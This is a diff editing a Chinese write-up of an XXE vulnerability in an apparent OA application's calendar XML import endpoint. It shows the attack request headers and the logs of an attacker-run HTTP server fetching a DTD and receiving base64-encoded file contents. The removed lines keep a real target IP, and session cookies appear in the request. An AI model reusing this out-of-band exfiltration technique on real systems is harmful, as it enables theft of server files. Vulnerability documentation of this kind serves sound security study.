@@ -71,7 +71,7 @@ Serving HTTP on 0.0.0.0 port 65531 ...
 
 ```
 POST /general/calendar/in_out/import_xml.php HTTP/1.1
-Host: 211.138.191.187:88
+Host: 127.0.0.1
 Content-Length: 1192
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
@@ -79,7 +79,7 @@ Origin: http://211.138.191.187:88
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarym6iluHiJGivtWxrd
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://211.138.191.187:88/general/calendar/in_out/
+Referer: http://127.0.0.1:88/general/calendar/in_out/
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: SID_1=9cdfdedc; SID_4002=fd08b4a7; USER_NAME_COOKIE=%C0%EE%D3%C2; OA_USER_ID=3795; PHPSESSID=r5dr5gthsdma6h40pcplgehen2; SID_3795=50974747
@@ -137,14 +137,26 @@ Content-Disposition: form-data; name="CAL_AFF_TASK"
 
 远程主机收到请求：
 
-![image-20200819223622585](C:\Users\jk\AppData\Roaming\Typora\typora-user-images\image-20200819223622585.png)
+```shell
+python -m SimpleHTTPServer 65531
+Serving HTTP on 0.0.0.0 port 65531 ...
+127.0.0.1 - - [20/Aug/2020 11:04:23] "GET /xxe.dtd HTTP/1.0" 200 -
+
+```
 
 监听端口收到了读取的本地文件内容，内容经过base64编码如下所示：
 
-![image-20200819223635939](C:\Users\jk\AppData\Roaming\Typora\typora-user-images\image-20200819223635939.png)
+```shell
+ python -m SimpleHTTPServer 9999
+Serving HTTP on 0.0.0.0 port 9999 ...
+127.0.0.1 - - [20/Aug/2020 11:04:23] "GET /?p=aXQncyB4eGUh HTTP/1.0" 200 -
 
+```
 
 Base64解码，得到文件内容：
 
-![image-20200819223642616](C:\Users\jk\AppData\Roaming\Typora\typora-user-images\image-20200819223642616.png)
+```shell
+root@kali:~# echo -n "aXQncyB4eGUh" |base64 -d
+it's xxe!
+```
 
